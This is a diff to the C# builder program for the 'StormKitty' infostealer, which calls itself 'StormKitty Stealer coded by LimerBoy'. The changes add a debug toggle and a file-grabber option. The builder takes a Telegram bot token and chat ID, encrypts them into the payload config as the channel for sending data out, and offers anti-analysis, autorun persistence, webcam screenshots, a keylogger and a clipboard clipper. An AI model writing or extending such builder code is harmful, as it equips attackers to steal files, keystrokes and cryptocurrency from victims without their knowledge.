@@ -12,15 +12,19 @@ namespace StormKittyBuilder
         [STAThreadAttribute]
         static void Main(string[] args)
         {
+            Console.Title = "StormKitty builder";
+            cli.ShowInfo("StormKitty Stealer coded by LimerBoy");
             // Settings
             string token = cli.GetStringValue("Telegram API token");
             string chatid = cli.GetStringValue("Telegram chat ID");
+            // Enable debug mode
+            build.ConfigValues["Debug"] = cli.GetBoolValue("Enable debug mode?");
             // Test connection to telegram API
-            if (!telegram.SendMessage("✅ *StormKitty* builder connected successfully!", token, chatid))
-                cli.ShowError("Failed connect to telegram bot api!");
-            else
-                cli.ShowSuccess("Connected successfully!\n");
-
+            if (build.ConfigValues["Debug"].Equals("0"))
+                if (!telegram.SendMessage("✅ *StormKitty* builder connected successfully!", token, chatid))
+                    cli.ShowError("Failed connect to telegram bot api!");
+                else
+                    cli.ShowSuccess("Connected successfully!\n");
             // Encrypt values
             build.ConfigValues["Telegram API"] = crypt.EncryptConfig(token);
             build.ConfigValues["Telegram ID"] = crypt.EncryptConfig(chatid);
@@ -28,8 +32,10 @@ namespace StormKittyBuilder
             build.ConfigValues["AntiAnalysis"] = cli.GetBoolValue("Use anti analysis?");
             build.ConfigValues["Startup"] = cli.GetBoolValue("Install autorun?");
             build.ConfigValues["StartDelay"] = cli.GetBoolValue("Use random start delay?");
+            // File grabber
+            build.ConfigValues["Grabber"] = cli.GetBoolValue("Enable file grabber?");
             // Modules
-            if(build.ConfigValues["Startup"].Equals("1")) {
+            if (build.ConfigValues["Startup"].Equals("1")) {
                 build.ConfigValues["WebcamScreenshot"] = cli.GetBoolValue("Create webcam screenshots?");
                 build.ConfigValues["Keylogger"] = cli.GetBoolValue("Install keylogger?");
                 build.ConfigValues["Clipper"] = cli.GetBoolValue("Install clipper?");
